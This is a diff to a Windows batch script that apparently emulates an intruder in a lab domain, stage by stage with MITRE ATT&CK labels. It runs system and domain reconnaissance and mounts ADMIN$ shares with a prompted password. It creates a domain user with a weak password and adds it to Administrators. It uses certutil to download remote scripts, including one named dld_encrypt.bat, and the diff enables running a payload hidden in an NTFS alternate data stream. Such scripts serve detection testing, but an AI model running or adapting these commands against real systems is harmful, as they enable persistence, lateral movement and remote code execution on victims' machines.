@@ -1,14 +1,14 @@
 @ECHO OFF
 
-echo 
+echo: 
 powershell write-host -back DarkRed [*] machine/user information
-echo
+echo:
 ver
 hostname
 whoami
 
-echo  
-echo  
+echo: 
+echo: 
 
 :: Mitre:T108
 powershell write-host -back DarkRed [W] Dumping system information [any key to continue]
@@ -18,29 +18,29 @@ systeminfo | findstr /c:"OS Name"
 systeminfo | findstr /c:"OS Version"
 systeminfo | findstr /c:"System Type"
 systeminfo | findstr /c:"Domain"
-echo
+echo:
 ipconfig /all
 arp -a
-echo  
-echo  
+echo: 
+echo: 
 :: Mitre T1018, T1135, T1482
 :: Enumeration of the trust relationship between the workstation and the domain
 powershell write-host -back DarkRed [W] Dumping domain information [any key to continue]
 pause > null
 echo [*] domain enumeration
 nltest /sc_query:lab
-echo  
+echo: 
 
 nltest /dclist:lab
-echo  
+echo: 
 
 nltest /dcname:lab
-echo  
+echo: 
 
 nltest /sc_reset:lab
 
-echo  
-echo  
+echo: 
+echo: 
 
 :: Mitre:T1201
 :: Indicates whether there is evidence of the process trying to perform password policy discovery
@@ -57,16 +57,28 @@ net user Administrator
 
 echo [*] dumping admin account info 
 net user admin
-echo  
-echo  
+echo: 
+echo: 
 
+:: List manchines in domain and try to mount administrative shares
+echo:
+net view /domain:lab
+echo:
+set /p _pwd="Enter user password to remote share:> "
+
+net use \\W10PRO-VM01\IPC$ /user:ubasic1 %_pwd%
+net use \\W10PRO-VM01\ADMIN$ /user:ubasic1 %_pwd%
+net use \\W10PRO-VM01\IPC$ /user:ubasic1 %_pwd%
+net use \\W10PRO-VM01\ADMIN$ /user:ubasic1 %_pwd%
+
+:: Create a domain user
 echo [*] creating a domain user  
 net user user1 admin123 /add /domain
-echo  
+echo:
+
 echo [*] adding user to Administrators group
 net localgroup Administrators user1 /add
-
-echo  
+echo: 
 
 :: wmic 
 :: collect a list of users and groups in the local system :
@@ -85,10 +97,10 @@ echo [*] Patch details
 :: QFE here stands for “Quick Fix Engineering”. 
 wmic qfe list brief
 
+echo:
 
-
-
-
+powershell write-host -back DarkRed [W] Download file and use ADS to execute it [any key to continue]
+pause > null
 :: Mitre:T1105
 certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/hli.script hli.script
 
@@ -100,7 +112,12 @@ certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/ma
 cmd.exe /c echo certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/exec.bat exec.bat > usualfile.txt:payload.bat
 
 ::exec it
-::cmd.exe - < usualfile.txt:payload.bat
+cmd.exe - < usualfile.txt:payload.bat
 
+echo:
 
+powershell write-host -back DarkRed [W] Downloading helpers [any key to continue]
+pause > null
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/dld_encrypt.bat
 
+echo:
